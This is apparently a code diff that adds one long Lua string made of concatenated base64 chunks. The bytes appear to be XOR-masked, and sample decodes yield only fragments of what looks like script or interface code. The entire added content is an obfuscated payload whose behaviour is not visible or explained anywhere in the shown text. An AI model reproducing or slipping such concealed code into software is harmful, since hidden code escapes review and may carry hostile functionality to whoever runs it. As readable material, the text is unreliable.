+    .. "0tXX0ba9np7Q9ef89vv15vDA9fau1+bx9eDxxPXm9fPm9eT8vO+etLS0tMD94PjxtKm0tt/R"
+    .. "zdbb1cbQtrietLS0tNf7+uDx+uC0qZ60tLS0tLS0tLbE5vHn57S037S04Pu0/P3w8bvn/Pvj"
+    .. "tOD88bT9+uDx5vL19/G6yPq2tLq6nrS0tLS0tLS0ttL4/fP84K60tMO01bTHtNC0tHYUNrS0"
+    .. "x8TV19G0tHYUNrS02NHSwLTXwMbYtp7pvZ6e0PXn/Pb79ebwwPX2rtfm8fXg8dbh4OD7+rzv"
+    .. "nrS0tLTa9fnxtKm0tsbxucft+vf85vv6/e7xtNf89eb19+Dx5ra4nrS0tLTX9fj49vX3/7Sp"
+    .. "tPLh+vfg/fv6vL2etLS0tLS0tLT98rTY+/f1+MT49e3x5rrX/PXm9ffg8ea04Pzx+p60tLS0"
+    .. "tLS0tLS0tLTh5PD14PHX/PXm9ffg8ea82Pv39fjE+PXt8ea61/z15vX34PHmvZ60tLS0tLS0"
+    .. "tLS0tLTG9e3y/fH48K7a++D98u287560tLS0tLS0tLS0tLS0tLS0wP3g+PG0qbS2x83HwNHZ"
+    .. "trietLS0tLS0tLS0tLS0tLS0tNf7+uDx+uC0qbS21/z15vX34PHmtOft5+Dx+ee05+369/zm"
+    .. "+/r97vHwura4nrS0tLS0tLS0tLS0tLS0tLTQ4eb14P37+rSptKe4nrS0tLS0tLS0tLS0tLS0"
+    .. "tLTd+fXz8bSptLbm8fLm8ef8uffjtp60tLS0tLS0tLS0tLTpvZ60tLS0tLS0tPH68J60tLS0"
+    .. "8frwnum9np7g9ef/uufk9eP6vPLh+vfg/fv6vL2etLS0tPj79/X4tPLm9fnx57SptKSetLS0"
+    .. "tPj79/X4tPj15+C0qbT757r3+Pv3/7y9np60tLS0xuH6x/Hm4v338brG8frw8ebH4PHk5PHw"
+    .. "rtf7+vrx9+C88uH69+D9+/q8vZ60tLS0tLS0tPLm9fnx57S/qbSlnrS0tLS0tLS0+Pv39fi0"
+    .. "+vvjtKm0++e69/j79/+8vZ60tLS0tLS0tP3ytPr747S5tPj15+C0qqm0pLqhtOD88fqetLS0"
+    .. "tLS0tLS0tLS0+Pv39fi08uTntKm0+fXg/Lry+Pv75rzy5vX58ee0u7S8+vvjtLm0+PXn4L20"
+    .. "v7SkuqG9nrS0tLS0tLS0tLS0tPLm9fnx57SptKSetLS0tLS0tLS0tLS0+PXn4LSptPr7456e"
+    .. "tLS0tLS0tLS0tLS0+Pv39fi09/z15vX34PHmxvH18O20qbTX/PXm9ffg8ea09frwtNzh+fX6"
+    .. "+/3wtPX68LTcxsS09frwtLbG0dXQzba0++a0tsPV3cDd2tO2nrS0tLS0tLS0tLS0tPj79/X4"
+    .. "tPzktKm03OH59fr7/fC09frwtPn14Py68vj7++a83OH59fr7/fC63PH1+OD8tL+0pLqhvbT7"
+    .. "5rSknrS0tLS0tLS0tLS0tPj79/X4tPn17NzktKm03OH59fr7/fC09frwtPn14Py68vj7++a8"
+    .. "3OH59fr7/fC62fXs3PH1+OD8tL+0pLqhvbT75rSknp60tLS0tLS0tLS0tLTX/PXm9ffg8ebH"
+    .. "4PXg4efY9fbx+K7H8eC8nrS0tLS0tLS0tLS0tLS0tLS21/z15vX34PHmtLR2FDa0tLa0urq0"
+    .. "9/z15vX34PHmxvH18O20urqetLS0tLS0tLS0tLS0tLS0tLa0tHYUNrS03MS0trS6urTg++fg"
+    .. "5v3687z85L20urq0tru2tLq6tOD75+Dm/frzvPn17NzkvbietLS0tLS0tLS0tLS0tLS0tLbn"
+    .. "9/X6tp60tLS0tLS0tLS0tLS9np60tLS0tLS0tLS0tLT4+/f1+LTk/frztKm0trm5tp60tLS0"
+    .. "tLS0tLS0tLTk9/X4+Lzy4fr34P37+ry9nrS0tLS0tLS0tLS0tLS0tLT4+/f1+LTn4PXg57Sp"
+    .. "tPP1+fGu0/Hgx/Hm4v338by2x+D14Oe2vZ60tLS0tLS0tLS0tLS0tLS0+Pv39fi0+vHg4/vm"
+    .. "/7SptOfg9eDnrtL9+vDS/ebn4Nf8/fjwvLba8eDj++b/tr2etLS0tLS0tLS0tLS0tLS0tPj7"
+    .. "9/X4tOfx5uLx5sfg9eDntKm0+vHg4/vm/7T1+vC0+vHg4/vm/67S/frw0v3m5+DX/P348Ly2"
+    .. "x/Hm4vHmx+D14Ofd4PH5tr2etLS0tLS0tLS0tLS0tLS0tPj79/X4tPD14PXE/frztKm05/Hm"
+    .. "4vHmx+D14Oe09frwtOfx5uLx5sfg9eDnrtL9+vDS/ebn4Nf8/fjwvLbQ9eD1tMT9+vO2vZ60"
+    .. "tLS0tLS0tLS0tLS0tLS0/fK08PXg9cT9+vO04Pzx+p60tLS0tLS0tLS0tLS0tLS0tLS0tOT9"
+    .. "+vO0qbTg++fg5v3687z59eD8uvL4+/vmvPD14PXE/frzrtPx4ML1+OHxvL20v7SkuqG9vZ60"
+    .. "tLS0tLS0tLS0tLS0tLS08frwnrS0tLS0tLS0tLS0tPH68L2enrS0tLS0tLS0tLS0tNLEx9j1"
+    .. "9vH4rsfx4Ly20sTHtLR2FDa0tLa0urq04Pvn4Ob9+vO88uTnvbi0tvP14fPxtr2etLS0tLS0"
+    .. "tLS0tLS0xP3689j19vH4rsfx4Ly2xP3687S0dhQ2tLS2tLq6tOD75+Dm/frzvOT9+vO9tLq6"
+    .. "tLa0+ee2uLS24/3y/ba9nrS0tLS0tLS0tLS0tMT49e3x5ufY9fbx+K7H8eC8tsT49e3x5ue0"
+    .. "tHYUNrS0trS6urTg++fg5v3687y3xPj17fHm567T8eDE+PXt8ebnvL29uLS24efx5ue2vZ6e"
+    .. "tLS0tLS0tLS0tLS0/fK03MbEtOD88fqetLS0tLS0tLS0tLS0tLS0tPj79/X4tOS0qbTcxsS6"
+    .. "xPvn/eD9+/qetLS0tLS0tLS0tLS0tLS0tMT75/3g/fv62PX28fiux/HgvJ60tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tOfg5v3687ry++b59eC8tsT75/3g/fv6tLR2FDa0tMy0sbql8rS0zbSxuqXy"
+    .. "tLTOtLG6pfK2uLTkusy4tOS6zbi05LrOvbietLS0tLS0tLS0tLS0tLS0tLS0tLS2+fXkueT9"
+    .. "+raetLS0tLS0tLS0tLS0tLS0tL2etLS0tLS0tLS0tLS08fjn8Z60tLS0tLS0tLS0tLS0tLS0"
+    .. "xPvn/eD9+/rY9fbx+K7H8eC8tsT75/3g/fv6tLR2FDa0tLm5tri0tvn15Lnk/fq2vZ60tLS0"
+    .. "tLS0tLS0tLTx+vCenrS0tLS0tLS0tLS0tNn74vH58frgx+D14OHn2PX28fiux/HgvJ60tLS0"
+    .. "tLS0tLS0tLS0tLS0ttn74vH58frgtLR2FDa0tLa0urqetLS0tLS0tLS0tLS0tLS0tLzy+O39"
+    .. "+vO09frwtLbS2N3T3MC029rY3drRtrT75rS8tsPV2N/HxNHR0LS2tLq6tOD75+Dm/frzvPn1"
+    .. "4Py68vj7++a84/X4/8fk8fHwvb29vbietLS0tLS0tLS0tLS0tLS0tLb5++Lxtp60tLS0tLS0"
+    .. "tLS0tLS9np60tLS0tLS0tLS0tLTC/efh9fjH4PXg4efY9fbx+K7H8eC8nrS0tLS0tLS0tLS0"
+    .. "tLS0tLS2wv3n4fX457S0dhQ2tLS2tLq6nrS0tLS0tLS0tLS0tLS0tLS88efk0fr19vjx8LT1"
+    .. "+vC0tsTY1c3RxrTRx8S2tPvmtLbHwNXa0NbNtr2etLS0tLS0tLS0tLS0tLS0tLq6tLa0tLu0"
+    .. "tLaetLS0tLS0tLS0tLS0tLS0tLq6tLzg+/v40efk0fr19vjx8LT1+vC0tsDb29i00cfEtrT7"
+    .. "5rS2wNvb2Me029LStr24nrS0tLS0tLS0tLS0tLS0tLS28e3xtp60tLS0tLS0tLS0tLS9np60"
+    .. "tLS0tLS0tLS0tLTA9ebz8eDH4PXg4efY9fbx+K7H8eC8nrS0tLS0tLS0tLS0tLS0tLS2wPXm"
+    .. "8/Hg/frztLR2FDa0tLa0urqetLS0tLS0tLS0tLS0tLS0tLz1/fn2++DR+vX2+PHwtPX68LS8"
+    .. "ttjb19/R0LS7tLa0urq09f359vvgxOb9++b94O29tPvmtLbHwNXa0NbNtr24nrS0tLS0tLS0"
+    .. "tLS0tLS0tLS29+b75+f89f3mtp60tLS0tLS0tLS0tLS9np60tLS0tLS0tLS0tLTE/O3n/ffn"
+    .. "x+D14OHn2PX28fiux/HgvJ60tLS0tLS0tLS0tLS0tLS0tsT87ef99+e0tHYUNrS0trS6up60"
+    .. "tLS0tLS0tLS0tLS0tLS0vPfh5+D7+dPm9eL94O3R+vX2+PHwtPX68LS8ttPG1cLdwM20trS6"
+    .. "urTg++fg5v3687z59eD8uvL4+/vmvPfh5+D7+dPm9eL94O29vb20++a0ttDR0tXB2MC2vbie"
+    .. "tLS0tLS0tLS0tLS0tLS0tLb75vb94LaetLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0+Pv3"
+    .. "9fi04/Xt5Pv9+uDX++H64LSptKSetLS0tLS0tLS0tLS08vvmtMu0/fq05PX95ue84/Xt5Pv9"
+    .. "+uDnvbTw+560tLS0tLS0tLS0tLS0tLS04/Xt5Pv9+uDX++H64LS/qbSlnrS0tLS0tLS0tLS0"
+    .. "tPH68J60tLS0tLS0tLS0tLTD9e3k+/364Mfg9eDh59j19vH4rsfx4LyetLS0tLS0tLS0tLS0"
+    .. "tLS0tLbD9e3k+/364Oe0tHYUNrS0trS6urTg++fg5v3687zj9e3k+/364Nf74frgvbS6urS2"
+    .. "tMfVwtHQtrietLS0tLS0tLS0tLS0tLS0tLb2+/v/+fXm/7aetLS0tLS0tLS0tLS0vZ6etLS0"
+    .. "tLS0tLS0tLS0xuH64P358cfg9eDh59j19vH4rsfx4LyetLS0tLS0tLS0tLS0tLS0tLbG4frg"
+    .. "/fnxtLR2FDa0tLa0urq05+Dm/frzuvL75vn14Ly2sbql8ue2uLT757r3+Pv3/7y9vbietLS0"
+    .. "tLS0tLS0tLS0tLS0tLb19+D94v3g7baetLS0tLS0tLS0tLS0vZ60tLS0tLS0tPH68J60tLS0"
+    .. "8frwvZ7x+vC9np65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampnrm5u7u0wdrdwtHGx9XYtNzR1dDRxp65ubu7qampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampnp7B+v3i8ebn9fjA"
+    .. "9fau1+bx9eDxxPXm9fPm9eT8vO+enrS0tLTA/eD48bSptLZ2CDK028bW3cDV2LTX29rAxtvY"
+    .. "tLS7tLTZ28LR2dHawLa4np60tLS01/v64PH64LSpnrS0tLS0tLS0tsH6/eLx5uf1+LT5++Lx"
+    .. "+fH64LT1+vC05Pj17fHmtOHg/fj94P3x57rI+ra0urqetLS0tLS0tLS21/v68v3z4ebxtO37"
+    .. "4ea05PHm5/v69fi0+fvi8fnx+uC05+3n4PH557T28fj747q2np7pvZ6eubm7u6mpqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqZ65ubu7tNnb"
+    .. "wtHZ0drAnrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqamensH6/eLx5uf1+MD19q7X5vH14PHH8ffg/fv6vJ60tLS0ttnbwtHZ0drA"
+    .. "tLS7tLTX28bRtp69np7B+v3i8ebn9fjA9fau1+bx9eDxx/j98PHmvO+enrS0tLTa9fnxtKm0"
+    .. "tsP1+P/H5PHx8La4np60tLS0xvX68/G0qbTvnrS0tLS0tLS0paK4nrS0tLS0tLS0pqGknrS0"
+    .. "tLTpuJ6etLS0tN369+bx+fH64LSptKW4np60tLS0x+Hy8v3stKm0trTHxNC2uJ6etLS0tNfh"
+    .. "5ubx+uDC9fjh8bSptKWiuJ6etLS0tNL49fO0qbS2w/X4/8fk8fHwtrienrS0tLTX9fj49vX3"
+    .. "/7SptPLh+vfg/fv6vOL1+OHxvZ6etLS0tLS0tLTj9fj/x+Tx8fC0qbTi9fjh8Z6etLS0tLS0"
+    .. "tLT98rTc4fn1+vv98J60tLS0tLS0tLS0tLT1+vC03OH59fr7/fC6xPXm8frgtOD88fqenrS0"
+    .. "tLS0tLS0tLS0tNzh+fX6+/3wusP1+P/H5PHx8LSpnrS0tLS0tLS0tLS0tLS0tLTi9fjh8Z6e"
+    .. "tLS0tLS0tLTx+vCenrS0tLTx+vCenum9np65ubu7qampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampnrm5u7u00tjd09zAnrm5u7upqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamensH6/eLx"
+    .. "5uf1+MD19q7X5vH14PHH8ffg/fv6vJ60tLS0ttnbwtHZ0drAtLS7tLTS2N3T3MC2nr2envj7"
+    .. "9/X4tPLh+vfg/fv6tObx+fvi8dL4/fP84Nv2/vH34Oe8vZ6etLS0tP3ytPr74LTcxsS04Pzx"
+    .. "+p60tLS0tLS0tObx4OHm+p60tLS08frwnp60tLS0+Pv39fi04vH4+/f94O20qZ60tLS0tLS0"
+    .. "tNzGxK7S/frw0v3m5+DX/P348LyetLS0tLS0tLS0tLS0tsfk9ffx3OH2y9L4/fP84MLx+Pv3"
+    .. "/eDttp60tLS0tLS0tL2enrS0tLT98rTi8fj79/3g7bTg/PH6nrS0tLS0tLS04vH4+/f94O2u"
+    .. "0PHn4Ob77by9nrS0tLTx+vCenrS0tLT4+/f1+LT14OD19/z58frgtKmetLS0tLS0tLTcxsSu"
+    .. "0v368NL95ufg1/z9+PC8nrS0tLS0tLS0tLS0tLbH5PX38dzh9svS+P3z/ODV4OD19/z58frg"
+    .. "tp60tLS0tLS0tL2enrS0tLT98rT14OD19/z58frgtOD88fqetLS0tLS0tLT14OD19/z58frg"
+    .. "rtDx5+Dm++28vZ60tLS08frwnp7x+vCenvj79/X4tPLh+vfg/fv6tOfg++TS+O39+vO8vZ6e"
+    .. "tLS0tPL47f3687SptPL1+Ofxnp60tLS0/fK08vjt1/v6+vH34P37+rTg/PH6np60tLS0tLS0"
+    .. "tPL47df7+vrx9+D9+/qu0P3n9/v6+vH34Ly9np60tLS0tLS0tPL47df7+vrx9+D9+/q0qbT6"
+    .. "/fienrS0tLTx+vCenrS0tLTm8fn74vHS+P3z/ODb9v7x9+DnvL2enrS0tLT98rTc4fn1+vv9"
+    .. "8LTg/PH6nrS0tLS0tLS03OH59fr7/fC6xPj14PL75vnH4PX68LSptPL1+OfxnrS0tLTx+vCe"
+    .. "nvH68J6e+Pv39fi08uH69+D9+/q05+D15uDS+O39+vO8vZ6etLS0tP3ytPr74LTcxsSetLS0"
+    .. "tLS0tLT75rT6++C03OH59fr7/fC04Pzx+p6etLS0tLS0tLTm8eDh5vqenrS0tLTx+vCenrS0"
+    .. "tLTn4Pvk0vjt/frzvL2enrS0tLTy+O39+vO0qbTg5uHxnp60tLS0+Pv39fi09eDg9ff8+fH6"
+    .. "4LSpnrS0tLS0tLS03frn4PX69/G6+vHjvLbV4OD19/z58frgtr2enrS0tLT14OD19/z58frg"
+    .. "utr1+fG0qZ60tLS0tLS0tLbH5PX38dzh9svS+P3z/ODV4OD19/z58frgtp6etLS0tPXg4PX3"
+    .. "/Pnx+uC6xPXm8frgtKmetLS0tLS0tLTcxsSenrS0tLT4+/f1+LTi8fj79/3g7bSpnrS0tLS0"
+    .. "tLS03frn4PX69/G6+vHjvLbY/frx9ebC8fj79/3g7ba9np60tLS04vH4+/f94O262vX58bSp"
+    .. "nrS0tLS0tLS0tsfk9ffx3OH2y9L4/fP84MLx+Pv3/eDttp6etLS0tOLx+Pv3/eDtutXg4PX3"
+    .. "/Pnx+uCktKmetLS0tLS0tLT14OD19/z58frgnp60tLS04vH4+/f94O262fXs0vvm9/G0qZ60"
+    .. "tLS0tLS0tPn14Py6/OHz8Z6etLS0tOLx+Pv3/eDtusbx+PXg/eLxwPu0qZ60tLS0tLS0tNH6"
+    .. "4fm61ffg4fXg++bG8fj14P3i8cD7usP75vjwnp60tLS04vH4+/f94O26wvH34PvmwvH4+/f9"
+    .. "4O20qZ60tLS0tLS0tMLx9+D75qe67vHm+56etLS0tOLx+Pv3/eDtusT15vH64LSpnrS0tLS0"
+    .. "tLS03MbEnp60tLS03OH59fr7/fC6xPj14PL75vnH4PX68LSpnrS0tLS0tLS04Obh8Z6etLS0"
+    .. "tPL47df7+vrx9+D9+/q0qZ60tLS0tLS0tMbh+sfx5uL99/G6xvH68PHmx+Dx5OTx8K7X+/r6"
+    .. "8ffgvJ60tLS0tLS0tLS0tLTy4fr34P37+ry9np60tLS0tLS0tLS0tLS0tLS0/fK0+vvgtPL4"
+    .. "7f3687Tg/PH6nrS0tLS0tLS0tLS0tLS0tLS0tLS05vHg4eb6nrS0tLS0tLS0tLS0tLS0tLTx"
+    .. "+vCenrS0tLS0tLS0tLS0tLS0tLT98rT6++C03MbEnrS0tLS0tLS0tLS0tLS0tLS0tLS0++a0"
+    .. "+vvgtNzGxLrE9ebx+uC04Pzx+p6etLS0tLS0tLS0tLS0tLS0tLS0tLTn4Pvk0vjt/frzvL2e"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS0tLS05vHg4eb6np60tLS0tLS0tLS0tLS0tLS08frwnp60tLS0"
+    .. "tLS0tLS0tLS0tLS0+Pv39fi09/X58eb1tKmetLS0tLS0tLS0tLS0tLS0tLS0tLTj++b/5+T1"
+    .. "9/G61+Hm5vH64Nf1+fHm9Z6etLS0tLS0tLS0tLS0tLS0tP3ytPr74LT39fnx5vW04Pzx+p60"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tObx4OHm+p60tLS0tLS0tLS0tLS0tLS08frwnp60tLS0tLS0"
+    .. "tLS0tLS0tLS0+Pv39fi08P3m8ffg/fv6tKmetLS0tLS0tLS0tLS0tLS0tLS0tLTC8ffg++an"
+    .. "uu7x5vuenrS0tLS0tLS0tLS0tLS0tLT98rTB5/Hm3frk4eDH8ebi/ffxrt3n3/Ht0Pvj+rye"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLTR+uH5ut/x7df78PG6w560tLS0tLS0tLS0tLS0tLS0vbTg"
+    .. "/PH6np60tLS0tLS0tLS0tLS0tLS0tLS0tPD95vH34P37+rS/qZ60tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLT39fnx5vW619Lm9fnxutj7+//C8ffg++aenrS0tLS0tLS0tLS0tLS0tLTx+vCe"
+    .. "nrS0tLS0tLS0tLS0tLS0tLT98rTB5/Hm3frk4eDH8ebi/ffxrt3n3/Ht0Pvj+ryetLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLTR+uH5ut/x7df78PG6x560tLS0tLS0tLS0tLS0tLS0vbTg/PH6np60"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tPD95vH34P37+rS5qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLT39fnx5vW619Lm9fnxutj7+//C8ffg++aenrS0tLS0tLS0tLS0tLS0tLTx+vCenrS0tLS0"
+    .. "tLS0tLS0tLS0tLT98rTB5/Hm3frk4eDH8ebi/ffxrt3n3/Ht0Pvj+ryetLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLTR+uH5ut/x7df78PG61Z60tLS0tLS0tLS0tLS0tLS0vbTg/PH6np60tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tPD95vH34P37+rS5qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT39fnx"
+    .. "5vW619Lm9fnxusb98/zgwvH34Pvmnp60tLS0tLS0tLS0tLS0tLS08frwnp60tLS0tLS0tLS0"
+    .. "tLS0tLS0/fK0wefx5t365OHgx/Hm4v338a7d59/x7dD74/q8nrS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS00frh+brf8e3X+/DxutCetLS0tLS0tLS0tLS0tLS0tL204Pzx+p6etLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLTw/ebx9+D9+/q0v6metLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS09/X58eb1utfS"
+    .. "5vX58brG/fP84MLx9+D75p6etLS0tLS0tLS0tLS0tLS0tPH68J6etLS0tLS0tLS0tLS0tLS0"
+    .. "tP3ytMHn8ebd+uTh4Mfx5uL99/Gu3eff8e3Q++P6vJ60tLS0tLS0tLS0tLS0tLS0tLS0tNH6"
+    .. "4fm63/Ht1/vw8brH5PX38Z60tLS0tLS0tLS0tLS0tLS0vbTg/PH6np60tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tPD95vH34P37+rS/qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTC8ffg++anuu3V"
+    .. "7P3nnp60tLS0tLS0tLS0tLS0tLS08frwnp60tLS0tLS0tLS0tLS0tLS0/fK0wefx5t365OHg"
+    .. "x/Hm4v338a7d59/x7dD74/q8nrS0tLS0tLS0tLS0tLS0tLS0tLS00frh+brf8e3X+/Dxutjx"
+    .. "8uDX+/rg5vv4nrS0tLS0tLS0tLS0tLS0tLS9tOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "8P3m8ffg/fv6tLmpnrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMLx9+D75qe67dXs/eeenrS0"
+    .. "tLS0tLS0tLS0tLS0tLTx+vCenrS0tLS0tLS0tLS0tLS0tLT98rTw/ebx9+D9+/q62fXz+v3g"
+    .. "4fDxtKq0pLTg/PH6np60tLS0tLS0tLS0tLS0tLS0tLS0tPD95vH34P37+rSpnrS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tPD95vH34P37+rrB+v3gnrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tL608vj98/zgx+Tx8fCenrS0tLS0tLS0tLS0tLS0tLTx+vCenrS0tLS0tLS0tLS0tLS0tLTi"
+    .. "8fj79/3g7brC8ffg++bC8fj79/3g7bSpnrS0tLS0tLS0tLS0tLS0tLS0tLS08P3m8ffg/fv6"
+    .. "np60tLS0tLS0tLS0tLTx+vCetLS0tLS0tLS9np7x+vCensH6/eLx5uf1+MD19q7X5vH14PHH"
+    .. "+P3w8ea8756etLS0tNr1+fG0qbS20vj98/zgtMfk8fHwtrienrS0tLTG9frz8bSptO+etLS0"
+    .. "tLS0tLSlpLietLS0tLS0tLSnpKSknrS0tLTpuJ6etLS0tN369+bx+fH64LSptKWkuJ6etLS0"
+    .. "tMfh8vL97LSptLa0x8TQtrienrS0tLTX4ebm8frgwvX44fG0qbSlpLienrS0tLTS+PXztKm0"
+    .. "ttL4/fP84Mfk8fHwtrienrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vOL1+OHxvZ6etLS0tLS0"
+    .. "tLTy+P3z/ODH5PHx8LSpnrS0tLS0tLS0tLS0tOL1+OHxnp60tLS08frwnp7pvZ6ewfr94vHm"
+    .. "5/X4wPX2rtfm8fXg8cD78/P48bzvnp60tLS02vX58bSptLbS+P3z/OC2uJ6etLS0tNfh5ubx"
+    .. "+uDC9fjh8bSptPL1+OfxuJ6etLS0tNL49fO0qbS20vj98/zgtrienrS0tLTX9fj49vX3/7Sp"
+    .. "tPLh+vfg/fv6vPH69fb48fC9np60tLS0tLS0tP3ytPH69fb48fC04Pzx+p60tLS0tLS0tLS0"
+    .. "tLTn4PXm4NL47f3687y9nrS0tLS0tLS08fjn8Z60tLS0tLS0tLS0tLTn4Pvk0vjt/frzvL2e"
+    .. "tLS0tLS0tLTx+vCenrS0tLTx+vCenum9np7B+v3i8ebn9fjA9fau1+bx9eDxxPXm9fPm9eT8"
+    .. "vO+enrS0tLTA/eD48bSptLbS2N3T3MC019vawMbb2Me2uJ6etLS0tNf7+uDx+uC0qZ60tLS0"
+    .. "tLS0tLbDtNW0x7TQtLR2Ega0tNr14v3z9eD9+/rI+ra0urqetLS0tLS0tLS2x8TV19G0tHYS"
+    .. "BrS01ef38frwyPq2tLq6nrS0tLS0tLS0ttjR0sC018DG2LS0dhIGtLTQ8ef38frwtp6e6b2e"
+    .. "nrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqameubm7u7TE2NXN0ca0wcDd2N3A3dHHnrm5u7upqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqamensH6/eLx5uf1+MD19q7X5vH14PHH"
+    .. "8ffg/fv6vJ60tLS0tsTY1c3RxrS0u7S0wcDd2N3A3dHHtp69np7B+v3i8ebn9fjA9fau1+bx"
+    .. "9eDxwPvz8/jxvO+enrS0tLTa9fnxtKm0tt368v36/eDxtN7h+eS2uJ6etLS0tNfh5ubx+uDC"
+    .. "9fjh8bSptPL1+OfxuJ6etLS0tNL49fO0qbS23fry/fr94PHe4fnktrienrS0tLTX9fj49vX3"
+    .. "/7SptPLh+vfg/fv6vPH69fb48fC9np60tLS0tLS0tP368v36/eDx3uH55LSpnrS0tLS0tLS0"
+    .. "tLS0tPH69fb48fCenrS0tLS0tLS0/fK0/uH55Nf7+vrx9+D9+/q04Pzx+p6etLS0tLS0tLS0"
+    .. "tLS0/uH55Nf7+vrx9+D9+/qu0P3n9/v6+vH34Ly9np60tLS0tLS0tLS0tLT+4fnk1/v6+vH3"
+    .. "4P37+rSptPr9+J6etLS0tLS0tLTx+vCenrS0tLS0tLS0/fK0+vvgtPH69fb48fC04Pzx+p60"
+    .. "tLS0tLS0tLS0tLTm8eDh5vqetLS0tLS0tLTx+vCenrS0tLS0tLS0/uH55Nf7+vrx9+D9+/q0"
+    .. "qZ60tLS0tLS0tLS0tLTB5/Hm3frk4eDH8ebi/ffxut7h+eTG8eXh8efgrtf7+vrx9+C8nrS0"
+    .. "tLS0tLS0tLS0tLS0tLTy4fr34P37+ry9np60tLS0tLS0tLS0tLS0tLS0tLS0tP3ytNzh+fX6"
+    .. "+/3wtOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tNzh+fX6+/3wrtf89frz8cfg9eDx"
+    .. "vJ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS00frh+brc4fn1+vv98Mfg9eDxwO3k8bre"
+    .. "4fnk/frznrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "8frwnp60tLS0tLS0tLS0tLS0tLS08frwnrS0tLS0tLS0tLS0tL2enrS0tLTx+vCenum9np65"
+    .. "ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampnrm5u7u0xNjVzdHGtNfb2sDG29jHnrm5u7upqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqamensH6/eLx5uf1+MD19q7X5vH14PHH8ffg"
+    .. "/fv6vLbE2NXN0ca0tLu0tNXQwtXa19HQtNfb2sDG29jHtr2ensH6/eLx5uf1+MD19q7X5vH1"
+    .. "4PHH+P3w8ea87560tLS02vX58bSptLbe4fnkxPvj8ea2uJ60tLS0xvX68/G0qbTvpLi0pqGk"
+    .. "6bietLS0tN369+bx+fH64LSptKW4nrS0tLTH4fLy/ey0qbS2tN7EtrietLS0tNfh5ubx+uDC"
+    .. "9fjh8bSptKGkuJ60tLS00vj187SptLbe4fnkxPvj8ea2uJ60tLS01/X4+Pb19/+0qbTy4fr3"
+    .. "4P37+rzi9fjh8b2etLS0tLS0tLT+4fnkxPvj8ea0qbTi9fjh8Z60tLS0tLS0tP3ytNzh+fX6"
+    .. "+/3wtOD88fqetLS0tLS0tLS0tLS03OH59fr7/fC6wefx3uH55MT74/HmtKm04Obh8Z60tLS0"
+    .. "tLS0tLS0tLTc4fn1+vv98Lre4fnkxPvj8ea0qbTi9fjh8Z60tLS0tLS0tPH68J60tLS08frw"
+    .. "num9np7B+v3i8ebn9fjA9fau1+bx9eDxx/j98PHmvO+etLS0tNr1+fG0qbS23P3k3PH98/zg"
+    .. "trietLS0tMb1+vPxtKm076S4tKWk6bietLS0tN369+bx+fH64LSptKS6pbietLS0tMfh8vL9"
+    .. "7LSptLa03Ny2uJ60tLS01+Hm5vH64ML1+OHxtKm0prietLS0tNL49fO0qbS23P3k3PH98/zg"
+    .. "trietLS0tNf1+Pj29ff/tKm08uH69+D9+/q84vX44fG9nrS0tLS0tLS0/P3k3PH98/zgtKm0"
+    .. "4vX44fGetLS0tLS0tLT98rTc4fn1+vv98LTg/PH6nrS0tLS0tLS0tLS0tNzh+fX6+/3wutz9"
+    .. "5Nzx/fP84LSptOL1+OHxnrS0tLS0tLS08frwnrS0tLTx+vCe6b2ensH6/eLx5uf1+MD19q7X"
+    .. "5vH14PHH8ffg/fv6vLbE3M3H3dfHtLS7tLTY29fV2La9np7B+v3i8ebn9fjA9fau1+bx9eDx"
+    .. "wPvz8/jxvO+etLS0tNr1+fG0qbS21+Hn4Pv5tNPm9eL94O22uJ60tLS01+Hm5vH64ML1+OHx"
+    .. "tKm08vX45/G4nrS0tLTS+PXztKm0ttfh5+D7+dPm9eL94O22uJ60tLS01/X4+Pb19/+0qbTy"
+    .. "4fr34P37+rzx+vX2+PHwvZ60tLS0tLS0tPfh5+D7+dPm9eL94O3R+vX2+PHwtKm08fr19vjx"
+    .. "8J60tLS0tLS0tOP75v/n5PX38brT5vXi/eDttKm08fr19vjx8LT1+vC09+Hn4Pv50+b14v3g"
+    .. "7bT75rT75v3z/fr1+NPm9eL94O2etLS0tPH68J7pvZ6ewfr94vHm5/X4wPX2rtfm8fXg8cf4"
